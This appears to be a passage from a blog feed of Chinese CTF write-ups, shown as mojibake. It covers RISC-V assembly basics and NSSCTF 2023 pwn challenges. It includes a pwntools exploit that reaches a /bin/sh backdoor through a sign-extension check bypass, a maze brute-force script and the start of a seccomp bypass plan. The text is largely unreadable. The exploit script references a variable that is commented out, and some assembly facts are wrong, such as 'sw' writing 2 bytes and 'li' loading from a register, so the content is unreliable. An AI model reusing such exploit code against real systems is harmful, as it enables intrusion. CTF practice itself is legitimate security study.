¡ï¼Œç”±äºå—å¤Ÿäº†ç°æœ‰å¤„ç†å™¨æ¶æ„çš„å¤«æ‰å¿å’Œç›¸å…³çŸ¥è¯†äº§æƒçš„é™åˆ¶ï¼Œä¼¯å…‹åˆ©å¤§å­¦å†³å®šå‘æ˜ä¸€ç§å…¨æ–°çš„ã€ç®€å•ä¸”å¼€æ”¾å…è´¹çš„æŒ‡ä»¤é›†æ¶æ„ã€‚</p><p>ä»RISC-Våå­—å¯ä»¥çœ‹å‡ºï¼Œè¿™æ˜¯riscç¬¬5ä»£æŒ‡ä»¤é›†æ¶æ„ã€‚è€Œriscvç›®æ ‡æ˜¯â€œæˆä¸ºä¸€ç§å®Œå…¨å¼€æ”¾çš„æŒ‡ä»¤é›†æ¶æ„ï¼Œå¯è¢«ä»»ä½•å­¦æœ¯æœºæ„æˆ–å•†ä¸šç»„ç»‡è‡ªç”±ä½¿ç”¨â€œã€‚</p><h1 id="RISC-Vé€šç”¨å¯„å­˜å™¨"><a href="#RISC-Vé€šç”¨å¯„å­˜å™¨" class="headerlink" title="RISC-Vé€šç”¨å¯„å­˜å™¨"></a>RISC-Vé€šç”¨å¯„å­˜å™¨</h1><table><thead><tr><th>å¯„å­˜å™¨</th><th>ABIåç§°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>x0</td><td>zero</td><td>0å€¼å¯„å­˜å™¨ï¼Œç¡¬ç¼–ç ä¸º0ï¼Œå†™å…¥æ•°æ®å¿½ç•¥ï¼Œè¯»å–æ•°æ®ä¸º0</td></tr><tr><td>x1</td><td>ra</td><td>ç”¨äºè¿”å›åœ°å€ï¼ˆreturn addressï¼‰</td></tr><tr><td>x2</td><td>sp</td><td>ç”¨äºæ ˆæŒ‡é’ˆï¼ˆstack pointerï¼‰</td></tr><tr><td>x3</td><td>gp</td><td>ç”¨äºé€šç”¨æŒ‡é’ˆï¼ˆglobal pointerï¼‰</td></tr><tr><td>x4</td><td>tp</td><td>ç”¨äºçº¿ç¨‹æŒ‡é’ˆ</td></tr><tr><td>x5</td><td>t0</td><td>ç”¨äºå­˜æ”¾ä¸´æ—¶æ•°æ®æˆ–è€…å¤‡ç”¨é“¾æ¥å¯„å­˜å™¨</td></tr><tr><td>x6~x7</td><td>t1~t2</td><td>ç”¨äºå­˜æ”¾ä¸´æ—¶æ•°æ®å¯„å­˜å™¨</td></tr><tr><td>x8</td><td>s0&#x2F;fp</td><td>éœ€è¦ä¿å­˜çš„å¯„å­˜å™¨æˆ–è€…å¸§æŒ‡é’ˆå¯„å­˜å™¨</td></tr><tr><td>x9</td><td>s1</td><td>éœ€è¦ä¿å­˜å¯„å­˜å™¨</td></tr><tr><td>x10~x11</td><td>a0~a1</td><td>å‡½æ•°å‚æ•°æˆ–è€…è¿”å›å€¼å¯„å­˜å™¨</td></tr><tr><td>x12~x17</td><td>a2-a7</td><td>å‡½æ•°ä¼ é€’å‚æ•°å¯„å­˜å™¨</td></tr><tr><td>x18~x27</td><td>s2-s11</td><td>éœ€è¦ä¿å­˜çš„å¯„å­˜å™¨</td></tr><tr><td>x28~x31</td><td>t3~t6</td><td>ç”¨äºå­˜æ”¾ä¸´æ—¶æ•°æ®å¯„å­˜å™¨</td></tr></tbody></table><h1 id="å¸¸ç”¨æŒ‡ä»¤æµ…æ"><a href="#å¸¸ç”¨æŒ‡ä»¤æµ…æ" class="headerlink" title="å¸¸ç”¨æŒ‡ä»¤æµ…æ"></a>å¸¸ç”¨æŒ‡ä»¤æµ…æ</h1><p>ä¸€èˆ¬æ¥è¯´è¦è¯»æ‡‚å¤§è‡´çš„é€»è¾‘åªéœ€è¦å¸¸ç”¨çš„è¯»å†™å€¼ï¼Œæ¯”è¾ƒè·³è½¬è¿™ç±»å°±å¯ä»¥äº†ï¼Œå…¶ä»–ä¸ªåˆ«é™Œç”Ÿçš„å¯ä»¥çŒœï¼Œæˆ–è€…ä¸´æ—¶å»æŸ¥ï¼ˆå¾ˆå¤šå¯ä»¥ç›´æ¥çŒœå‡ºæ¥çš„ï¼‰</p><ul><li>lï¼ˆLoadï¼‰ç³»ï¼Œlå¼€å¤´çš„åŸºæœ¬å°±æ˜¯å–å€¼ï¼Œæ¯”å¦‚li a5, a4 å°±æ˜¯æŠŠa4çš„å€¼å–åˆ°a5é‚£é‡Œ</li></ul><blockquote><p>  å¦å¤–æœ‰ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„æ˜¯luiï¼Œaddiï¼Œè¿™ä¸¤ä¸ªæ˜¯å¯¹liçš„æ‹“å±•ï¼Œä¸€èˆ¬è¦ä¼ é€’ä¸€ä¸ªæ•°æ®ï¼ˆé€šå¸¸æ˜¯åœ°å€ï¼‰é«˜20ä½ç”¨luiï¼Œä½12ä½ç”¨addi</p><p>  æ¯”å¦‚ï¼šè¦ä¼ é€’0x11451419ç»™a5å¯„å­˜å™¨ï¼Œå°±ä¼šä½¿ç”¨</p><p>  lui a5, 0x11451</p><p>  addi a5, a5, 0x419</p></blockquote><ul><li>sï¼ˆstoreï¼‰ç³»ï¼Œså¼€å¤´åŸºæœ¬è¡¨ç¤ºå­˜å€¼ï¼Œæ¯”å¦‚sw a5, -14h(s0)ï¼Œè¡¨ç¤ºæŠŠa5å¯„å­˜å™¨çš„å€¼å†™å…¥s0åç§»ä¸º-0x14çš„åœ°å€</li></ul><blockquote><p>  lå’Œsæœ‰äº›æ—¶å€™è¦é åé¢çš„å­—æ¯æ¥çŒœå…·ä½“åŠŸèƒ½ï¼Œ</p><p>  æ¯”å¦‚å¦‚æœæ˜¯wç»“å°¾ï¼Œæƒ³åˆ°wordï¼Œé‚£ä¹ˆswï¼ˆstore wordï¼‰å°±å¯ä»¥çŒœæ˜¯å†™å…¥ä¸€ä¸ªwordï¼ˆ2å­—èŠ‚ï¼‰</p><p>  åŒç†è¿˜æœ‰lwï¼ˆload wordï¼‰ç­‰</p></blockquote><p><em>å½“ç„¶ä¹Ÿä¸æ˜¯æ‰€æœ‰så¼€å¤´éƒ½æ˜¯è¡¨ç¤ºstoreï¼Œè¿˜æœ‰æ¯”å¦‚slliï¼ˆshift left logical immediate é€»è¾‘å·¦ç§»ï¼‰</em></p><ul><li>jï¼ˆjumpï¼‰ç³»ï¼Œjå¼€å¤´åŸºæœ¬å°±æ˜¯è·³è½¬äº†ï¼Œè¿™é‡Œæ˜¯æ— æ¡ä»¶è·³è½¬</li></ul><blockquote><p>  æœ‰æ¡ä»¶çš„è·³è½¬å¸¸å¸¸æ˜¯bå¼€å¤´ï¼Œæ¯”å¦‚bgtz a5, label_1 å°±æ˜¯æŠŠa5å¯„å­˜çš„å€¼å’Œ0æ¯”è¾ƒï¼Œa5ä¸ºæ­£å°±ä¼šè·³è½¬åˆ°label_1ï¼Œä¸ºè´Ÿå°±ç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼›</p><p>  bge a5, a4, label2ï¼Œæ¯”è¾ƒa5å’Œa4ï¼Œa5 &gt;&#x3D; a4 è·³è½¬åˆ°label2ï¼Œåä¹‹ç»§ç»­æ‰§è¡Œ</p></blockquote><p>å…¶ä»–çš„è¯¸å¦‚ï¼šmvï¼Œcallï¼Œaddï¼Œretè¿™äº›æŒ‡ä»¤ï¼Œéƒ½æ¯”è¾ƒç†Ÿæ‚‰ï¼ŒåŠŸèƒ½ä¹Ÿå¤§å·®ä¸å·®ã€‚</p><h1 id="RISC-Vå®æˆ˜"><a href="#RISC-Vå®æˆ˜" class="headerlink" title="RISC-Vå®æˆ˜"></a>RISC-Vå®æˆ˜</h1>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rev </tag>
            
            <tag> ASM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023-8ä¸‹åŠæœˆæ¯”èµ›wp</title>
      <link href="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/"/>
      <url>/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<ul><li><em>NSSCTF-2ndï¼ˆpwnæ–¹å‘å…¨éƒ¨ï¼Œreä¸¤é“ï¼‰</em></li><li>WMCTFï¼ˆå¾…è¡¥å……ï¼‰</li><li><em>SEKAICTFï¼ˆreä¸€é“ï¼‰</em></li><li><em>ä¹Ÿè®¸è¿˜æœ‰â€¦â€¦</em></li></ul><span id="more"></span><h1 id="NSSCTF-2023"><a href="#NSSCTF-2023" class="headerlink" title="NSSCTF-2023"></a>NSSCTF-2023</h1><p>æ¯”èµ›ä¸­è§£å‡º2é“reå’Œ1é“pwnï¼Œç®—æ˜¯æ­£å¸¸å‘æŒ¥äº†</p><p><em><strong>ls-pwn(finish)ï¼š</strong></em></p><ul><li><em>NewBottleOldWine</em></li><li><em>xennyçš„è¯±æƒ‘</em></li><li><em>happy2</em></li></ul><p><em><strong>ls-reï¼š</strong></em></p><ul><li>MyBase</li><li>Bytecode</li></ul><h2 id="Pwn-NewBottleOldWine"><a href="#Pwn-NewBottleOldWine" class="headerlink" title="Pwn-NewBottleOldWine"></a>Pwn-NewBottleOldWine</h2><p><em><strong>é™„ä»¶ï¼š</strong></em><a href="../resources/pwn_asset/2023-8/newBottleOldWine" target="_block">newBottleOldWine</a></p><h3 id="åœ¨åšé¢˜ä¹‹å‰ï¼š"><a href="#åœ¨åšé¢˜ä¹‹å‰ï¼š" class="headerlink" title="åœ¨åšé¢˜ä¹‹å‰ï¼š"></a>åœ¨åšé¢˜ä¹‹å‰ï¼š</h3><p>æ–‡ä»¶æ˜¯RISC-Væ¶æ„çš„ï¼Œä¸´æ—¶å­¦äº†ä¸€ç‚¹risc-vçš„æ±‡ç¼–ï¼š</p><p>åšæœ¬é¢˜å¤§æ¦‚åªéœ€è¦çŸ¥é“å¦‚ä¸‹å‡ æ¡ï¼š</p><ul><li>lï¼ˆLoadï¼‰ç³»ï¼Œlå¼€å¤´çš„åŸºæœ¬å°±æ˜¯å–å€¼ï¼Œæ¯”å¦‚li a5, a4 å°±æ˜¯æŠŠa4çš„å€¼å–åˆ°a5é‚£é‡Œ</li></ul><blockquote><p>  å¦å¤–æœ‰ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„æ˜¯luiï¼Œaddiï¼Œè¿™ä¸¤ä¸ªæ˜¯å¯¹liçš„æ‹“å±•ï¼Œä¸€èˆ¬è¦ä¼ é€’ä¸€ä¸ªæ•°æ®ï¼ˆé€šå¸¸æ˜¯åœ°å€ï¼‰é«˜20ä½ç”¨luiï¼Œä½12ä½ç”¨addi</p><p>  æ¯”å¦‚ï¼šè¦ä¼ é€’0x11451419ç»™a5å¯„å­˜å™¨ï¼Œå°±ä¼šä½¿ç”¨</p><p>  lui a5, 0x11451</p><p>  addi a5, a5, 0x419</p></blockquote><ul><li>sï¼ˆstoreï¼‰ç³»ï¼Œså¼€å¤´åŸºæœ¬è¡¨ç¤ºå­˜å€¼ï¼Œæ¯”å¦‚sw a5, -14h(s0)ï¼Œè¡¨ç¤ºæŠŠa5å¯„å­˜å™¨çš„å€¼å†™å…¥s0åç§»ä¸º-0x14çš„åœ°å€</li><li>jï¼ˆjumpï¼‰ç³»ï¼Œjå¼€å¤´åŸºæœ¬å°±æ˜¯è·³è½¬äº†ï¼Œè¿™é‡Œæ˜¯æ— æ¡ä»¶è·³è½¬</li></ul><blockquote><p>  æœ‰æ¡ä»¶çš„è·³è½¬å¸¸å¸¸æ˜¯bå¼€å¤´ï¼Œæ¯”å¦‚bgtz a5, label_1 å°±æ˜¯æŠŠa5å¯„å­˜çš„å€¼å’Œ0æ¯”è¾ƒï¼Œa5ä¸ºæ­£å°±ä¼šè·³è½¬åˆ°label_1ï¼Œä¸ºè´Ÿå°±ç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼›</p><p>  bge a5, a4, label2ï¼Œæ¯”è¾ƒa5å’Œa4ï¼Œa5 &gt;&#x3D; a4 è·³è½¬åˆ°label2ï¼Œåä¹‹ç»§ç»­æ‰§è¡Œ</p></blockquote><p>å…¶ä»–çš„è¯¸å¦‚ï¼šmvï¼Œcallï¼Œaddï¼Œretè¿™äº›æŒ‡ä»¤ï¼Œéƒ½æ¯”è¾ƒç†Ÿæ‚‰ï¼ŒåŠŸèƒ½ä¹Ÿå¤§å·®ä¸å·®ã€‚</p><h3 id="æ±‡ç¼–ç åˆ†æ"><a href="#æ±‡ç¼–ç åˆ†æ" class="headerlink" title="æ±‡ç¼–ç åˆ†æ"></a>æ±‡ç¼–ç åˆ†æ</h3><p>è¿›å»å…ˆæ‰¾æ‰¾æœ‰æ²¡æœ‰åé—¨ï¼š</p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/backdoor.png" alt="backdoor" style="zoom:67%;"><p>åé—¨åœ¨0x1145162Açš„ä½ç½®ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œç”¨luiå’Œaddiä¼ é€’äº†ä¸€ä¸ªå®Œæ•´çš„å­—ç¬¦ä¸²åœ°å€ï¼Œç„¶åcall systemï¼Œè·Ÿè¿›å»çœ‹è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯&#x2F;bin&#x2F;sh</p><p>ç„¶åå¾€ä¸Šç¿»å‘ç°äº†ä¸¤ä¸ªä¸»è¦å‡½æ•°ï¼š</p><p>ä¸€ä¸ªå…·æœ‰æ ˆæº¢å‡ºæ¼æ´ï¼ˆæ‰€ä»¥æŠŠè¿™ä¸ªå‡½æ•°æ”¹åä¸ºäº†vulnï¼‰</p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/vuln.png" alt="vuln" style="zoom: 67%;"><p>å¦ä¸€ä¸ªåº”è¯¥å°±æ˜¯ä¸»ç¨‹åº</p><p><em><strong>mainå‰åŠæ®µï¼š</strong></em></p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/main_1.png" alt="main_1" style="zoom:67%;"><p>å¯ä»¥çœ‹åˆ°ç¨‹åºå…ˆè¯»å…¥äº†ä¸€ä¸ªint64ï¼Œå¹¶æŠŠå€¼ä¼ è¿›qword_11453058</p><p>ç„¶ååœ¨æŠŠqword_11453058çš„å€¼ä¼ ç»™a5å¯„å­˜å™¨ï¼Œç”¨sext.wæŒ‡ä»¤æŠŠa5æ‹“å±•</p><blockquote><p>  sext.wçš„ä½œç”¨æ˜¯æŠŠ32ä½æ‹“å±•åˆ°64ä½ï¼Œä¿ç•™ç¬¦å·ï¼Œæ¯”å¦‚-1ï¼Œåå…­è¿›åˆ¶è¡¨ç¤ºä¸º0xffffffffï¼Œ æ‹“å±•ä¸º64ä½å°±æŠŠé«˜32ä½å…¨éƒ¨å¡«å……1ï¼ˆä¿è¯è¿˜æ˜¯å’Œ32ä½ç¬¦å·ä¸€è‡´ï¼‰ï¼Œå˜æˆäº†0xffffffffffffffffï¼› å¦‚æœæ˜¯æ­£æ•°ï¼Œå°±æŠŠé«˜32ä½å…¨éƒ¨å¡«å……0ï¼›</p></blockquote><p>è¿™é‡ŒæŠŠa5æ‹“å±•åå†å’Œ0æ¯”è¾ƒï¼Œå°äºå°±ä¼šç»§ç»­å¾€ä¸‹æ‰§è¡Œåˆ°exitï¼Œæ‰€ä»¥è¿™é‡Œ<strong>a5å¿…é¡»è¦å¤§äº0</strong></p><p>ç„¶åå¦‚æœå¤§äº0è·³è½¬åï¼Œé‡æ–°ä»qword_11453058å–å€¼åˆ°a4å¯„å­˜å™¨ï¼Œç„¶åa5èµ‹å€¼ä¸º0x9Fï¼ˆ159ï¼‰ï¼Œç„¶åa5ï¼Œ a4æ¯”è¾ƒï¼Œå¦‚æœa5&lt;a4ï¼Œä¹Ÿå°±æ˜¯a4&gt;&#x3D;160å°±ä¼šç»§ç»­å¾€ä¸‹æ‰§è¡Œåˆ°exitã€‚</p><p><em><strong>mainååŠæ®µï¼š</strong></em></p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/main_2.png" alt="main_2" style="zoom:67%;"><p>æ‰€ä»¥è¦ä¿è¯&gt; 0 &amp;&amp; &lt; 160 æ‰å¯ä»¥è·³è½¬åˆ°è¿™é‡Œï¼Œè¿™æ®µé€»è¾‘å¾ˆç®€å•ï¼Œå°±æ˜¯å–äº†qword_11453058çš„ä½16ä½ï¼ˆswï¼Œåªå–wordï¼Œä¹Ÿå°±æ˜¯2å­—èŠ‚ï¼‰ï¼Œå†åŠ ä¸Šstartçš„åœ°å€ï¼ˆå°±æ˜¯åŸºåœ°å€0x11451400ï¼‰ï¼Œç„¶åè·³è½¬åˆ°è¿™ä¸ªåœ°å€ã€‚</p><p>ä¸€å¼€å§‹çš„æ€è·¯æ˜¯<strong>å…ˆè·³è½¬åˆ°readé‚£é‡Œæ ˆæº¢å‡ºåˆ°backdoor</strong></p><p>æˆ‘ä»¬å‘ç°vulnç¦»startæœ€è¿‘ï¼Œç›¸å·®0xA0ï¼ˆ160ï¼‰ï¼Œåˆšå¥½è¿‡ä¸äº†éªŒè¯ã€‚æ‰€ä»¥éœ€è¦ç»•è¿‡æ£€æµ‹ï¼Œå¯ä»¥è¾“å…¥ä¸€ä¸ªè´Ÿæ•°ï¼Œä¿è¯ä½32ä½æ˜¯æ­£æ•°å³å¯ã€‚è¿™æ ·åœ¨ç¬¬ä¸€æ­¥æ‹“å±•æ—¶å°±æ˜¯æ‹“å±•ä¸ºæ­£æ•°ï¼Œç»•è¿‡äº†ç¬¬ä¸€ä¸ªæ£€æµ‹ï¼Œç„¶åç¬¬äºŒä¸ªæ£€æµ‹é‚£é‡Œç”±äºæ˜¯è´Ÿæ•°<strong>ï¼ˆæ³¨æ„å‰é¢æ‹“å±•æ—¶æ˜¯æŠŠè¾“å…¥å€¼å–åˆ°äº†a5å¯„å­˜å™¨å†å¯¹a5æ‹“å±•ï¼Œè¾“å…¥çš„å€¼å¹¶æ²¡æœ‰å˜ï¼‰</strong>è‡ªç„¶å¯ä»¥ç»•è¿‡æ£€æµ‹ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><p><strong>æ‰“å®Œæ‰æƒ³åˆ°å¯ä»¥ç›´æ¥ä»mainè·³è½¬åˆ°åé—¨é‚£é‡Œï¼Œéƒ½ä¸ç”¨æ ˆæº¢å‡ºäº†</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>, <span class="number">28299</span>)</span><br><span class="line"><span class="comment"># to_vuln_offset = -9223372036854775648</span></span><br><span class="line"><span class="comment"># 1000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 1010 0000</span></span><br><span class="line"><span class="comment"># 0x114514a0</span></span><br><span class="line"></span><br><span class="line">to_sh_offset = -<span class="number">9223372036854775254</span></span><br><span class="line"><span class="comment"># 1000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0010 0010 1010</span></span><br><span class="line"><span class="comment"># 0x1145162a</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;have?&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(to_vuln_offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;*0x28 + p64(backdoor)</span></span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;bottle&#x27;)</span></span><br><span class="line"><span class="comment">#io.sendline(payload)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="Pwn-xennyçš„è¯±æƒ‘"><a href="#Pwn-xennyçš„è¯±æƒ‘" class="headerlink" title="Pwn-xennyçš„è¯±æƒ‘"></a>Pwn-xennyçš„è¯±æƒ‘</h2><p>è¿œç¨‹ä¼šå‘æ¥ä¸€å¤§æ®µæ•°æ®ï¼Œæ‹¿å»base64è§£å‡ºæ¥ä¸€ä¸ªELFæ–‡ä»¶</p><p><em><strong>æ–‡ä»¶ï¼š</strong></em><a href="../resources/pwn_asset/2023-8/xenny_map" target="_block">xenny_map</a></p><p>éœ€è¦å…ˆèµ°ä¸€æ®µè¿·å®«ï¼Œç„¶åorw</p><h3 id="è¿·å®«æ€è·¯ï¼š"><a href="#è¿·å®«æ€è·¯ï¼š" class="headerlink" title="è¿·å®«æ€è·¯ï¼š"></a>è¿·å®«æ€è·¯ï¼š</h3><blockquote><p>  <strong>æ¦‚å†µï¼š</strong></p><p>  è¿·å®«å¤ªå¤§äº†ï¼Œè€Œä¸”æ¯ä¸ªè·¯å£ï¼ˆå§‘ä¸”è¿™ä¹ˆè¯´ï¼Œ1000ä¸ªå‡½æ•°å½“ä½œ1000ä¸ªè·¯å£ï¼‰ï¼Œéƒ½è¿é€š10ä¸ªè·¯å£ï¼ˆå¯¹åº”è¾“å…¥çš„1-10ï¼‰ï¼Œå¦‚æœéƒ½ä¸æ˜¯å°±å›åˆ°å¼€å§‹çš„mainï¼ˆæ­¥æ•°ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶é‡Œçš„tmpä¸ä¼šç½®é›¶ï¼Œä¹Ÿä¼š+1ï¼‰ï¼Œè¦ä¿è¯åˆšå¥½ç¬¬1000æ­¥æ‰¾åˆ°xennyã€‚</p></blockquote><p>æˆ‘æ‡’å¾—åˆ†æå¦‚ä½•èµ°è¿·å®«äº†ï¼Œé€‰æ‹©ç›´æ¥éšæœºæ•°çˆ†ç ´ï¼šï¼‰ï¼Œæ•ˆæœè¿˜ä¸é”™</p><p>æœ¬åœ°å°±å…ˆæ¯æ¬¡å¯åŠ¨ä¸€ä¸ªç¨‹åºï¼Œç„¶åè®¾ç½®seedï¼ŒæŠŠèµ°è¿‡çš„æ¯ä¸€æ­¥éƒ½æ”¾åœ¨ä¸€ä¸ªæ•°ç»„é‡Œï¼ˆæˆ‘å«åšstep_arrï¼‰ï¼Œç„¶åå…ˆèµ°åˆ°xennyé‚£é‡Œ<del>ï¼ˆæ²¡åˆ°1000æ­¥ï¼Œå½“ç„¶ä¸åœ¨ï¼‰</del>ï¼Œç„¶åä¸€ç›´å‘<code>b&#39;\n&#39;</code>ï¼Œå°±æ˜¯ä¸€ç›´å›åˆ°mainï¼ˆå‘å…¶ä»–çš„ä¹Ÿè¡Œï¼Œè¿™ä¸ªé˜¶æ®µå°±éšä¾¿ä¹±èµ°ï¼Œåæ­£æœ¬åœ°è·‘çš„å¿«ï¼Œä¸è‡³äºä¼šalarm clockï¼‰ï¼Œæœ€åç•™å‡ºæ¥ä¸€å®šæ­¥æ•°ï¼Œå†é‡æ–°è·‘ä¸€éstep_arrï¼ˆå‡‘å¤Ÿ1000æ¬¡ï¼‰</p><p><strong>æœ¬åœ°ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">sd = <span class="number">1</span></span><br><span class="line">step = <span class="number">0</span></span><br><span class="line">step_arr = []</span><br><span class="line"><span class="comment">#io.recvuntil(b&quot;That&#x27;s all\n&quot;)</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># io = process([&#x27;seccomp-tools&#x27;, &#x27;dump&#x27;, &#x27;./map&#x27;])</span></span><br><span class="line">    io = process(<span class="string">&#x27;./map&#x27;</span>)</span><br><span class="line">    random.seed(sd)</span><br><span class="line">    <span class="keyword">while</span> <span class="string">b&#x27;xenny&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> io.recvline() <span class="keyword">and</span> step &lt; <span class="number">500</span>:</span><br><span class="line">        choice = random.randint(<span class="number">1</span>, <span class="number">10</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">        step += <span class="number">1</span></span><br><span class="line">        step_arr.append(choice)</span><br><span class="line">    log.info(<span class="string">&#x27;step: %d&#x27;</span> % step)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(step_arr) == <span class="number">500</span>:</span><br><span class="line">        sd += <span class="number">1</span></span><br><span class="line">        step = <span class="number">0</span></span><br><span class="line">        step_arr = []</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;step_arr: &#x27;</span>, step_arr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;seed:&#x27;</span>, sd)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">len_step_arr = <span class="built_in">len</span>(step_arr)</span><br><span class="line">log.info(<span class="string">&#x27;len_step_arr: %d&#x27;</span> % len_step_arr)</span><br><span class="line"><span class="built_in">print</span>(step_arr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span> - <span class="number">2</span> * len_step_arr):</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> step_arr:</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(i))</span><br></pre></td></tr></table></figure><p>è¦æ³¨æ„çš„æ˜¯ï¼š<strong>å› ä¸ºè¦è·‘2æ¬¡step_arrï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°ç»„é•¿åº¦ä¸èƒ½è¶…è¿‡500ï¼Œæ‰€ä»¥500åæˆ‘å°±é‡å¯äº†ç¨‹åºï¼Œï¼ˆé‡å¯è®°å¾—åˆå§‹åŒ–å˜é‡ï¼‰</strong></p><p><strong>è¿œç¨‹ï¼š</strong></p><p>è¿œç¨‹ä¹Ÿå·®ä¸å¤šè¿™æ ·ï¼Œä¸è¿‡è€ƒè™‘åˆ°æœ‰alarmï¼ˆ0x15ï¼‰ï¼Œæµ‹è¯•å¤§æ¦‚åªèƒ½æ”¶å‘100å¤šæ¬¡ï¼Œæ‰€ä»¥æŠŠä¸´ç•Œå€¼æ”¹æˆäº†150</p><p><code>while b&#39;xenny&#39; not in io.recvline() and step &lt; 150:</code></p><p><code>if len(step_arr) == 150:</code></p><p>åœ¨æ¢å®Œè·¯åï¼ˆæå‡ºæ¥step_arräº†ï¼‰ï¼Œå»ºè®®ä¸€ç›´å‘é1-10çš„ï¼Œè§¦å‘defaultè¿”å›mainï¼Œè¿™æ ·å¯ä»¥åˆ·æ–°alarmï¼ˆï¼‰</p><h3 id="æ²™ç®±æ€è·¯ï¼š"><a href="#æ²™ç®±æ€è·¯ï¼š" class="headerlink" title="æ²™ç®±æ€è·¯ï¼š"></a>æ²™ç®±æ€è·¯ï¼š</h3><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/sandbox.png" alt="sandbox"><p>å¯ä»¥çœ‹åˆ°ç¦äº†readï¼Œwriteï¼Œopenï¼Œå…ˆè¯•äº†ä¸€ä¸‹ç›´æ¥execveï¼Œæ‰“ä¸é€šï¼Œåº”è¯¥æ˜¯æ‰§è¡Œexecveè¿‡ç¨‹ä¸­è§¦å‘äº†æ²™ç®±çš„æŸä¸ªé™åˆ¶ï¼Œè¿™é‡Œè€ƒè™‘<strong>ä½¿ç”¨openatï¼Œreadvï¼Œwritevå‡½æ•°æ¥æ‹¿åˆ°flag</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span>  dirfd , <span class="type">const</span> <span class="type">char</span> * pathname , <span class="type">int</span>  flags , ... <span class="comment">/* mode_t  mode */</span>)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>  